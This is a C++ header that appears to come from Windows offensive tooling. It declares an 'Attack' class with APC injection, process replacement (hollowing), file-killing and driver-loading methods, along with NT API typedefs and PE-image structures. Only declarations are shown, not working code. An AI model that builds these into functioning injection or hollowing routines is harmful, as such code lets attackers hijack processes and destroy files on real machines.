#ifndef UNICODE
#define UNICODE
#define UNICODE_WAS_UNDEFINED
#endif

#include <Windows.h>

#ifdef UNICODE_WAS_UNDEFINED
#undef UNICODE
#endif

#include <cstring>
#include <iostream>
#include <vector>
#include <string>
#include <fstream>
#include <locale> 
#include <codecvt>
#include <tuple>
#include <memory>
#include <tchar.h>
#include <TlHelp32.h>
#include <winternl.h>
#include <stdio.h>

#include <AccCtrl.h>
#include <AclAPI.h>

using namespace std;

class Attack {
public:
	void SetFilePermission(LPCWSTR filename);
	vector<wstring> list_n_kill_files(wstring path);
	void LoadDriverBeep();
	BOOL APCinjection(string target, TCHAR *dll_name);
	BOOL ProcReplace(char *arg1, string arg2);
};

typedef NTSTATUS(WINAPI* _NtQueryInformationProcess)(
	_In_		HANDLE				ProcessHandle,
	_In_		PROCESSINFOCLASS	ProcessInformationClass,
	_Out_		PVOID				ProcessInformation,
	_In_		ULONG				ProcessInformationLength,
	_Out_opt_	PULONG				ReturnLength
);

typedef NTSTATUS(WINAPI* _ZwUnmapViewOfSection)(
	_In_		HANDLE				ProcessHandle,
	_In_opt_	PVOID				BaseAddress
);

typedef struct BASE_RELOCATION_BLOCK
{
	DWORD PageAddress;
	DWORD BlockSize;
} BASE_RELOCATION_BLOCK, *PBASE_RELOCATION_BLOCK;

typedef struct BASE_RELOCATION_ENTRY
{
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;

struct PE_FILE
{
	size_t				size_ids{};
	size_t				size_dos_stub{};
	size_t				size_inh32{};
	size_t				size_ish{};
	size_t				size_sections{};
	IMAGE_DOS_HEADER	ids;
	vector<char> MS_DOS_STUB;
	IMAGE_NT_HEADERS64	inh32;
	vector<IMAGE_SECTION_HEADER> ish;
	vector<shared_ptr<char>> Sections;
	void set_sizes(size_t, size_t, size_t, size_t, size_t);
};

struct LOADED_IMAGE64
{
	PIMAGE_NT_HEADERS64		FileHeader;
	ULONG					NumberOfSections;
	PIMAGE_SECTION_HEADER	Sections;
};
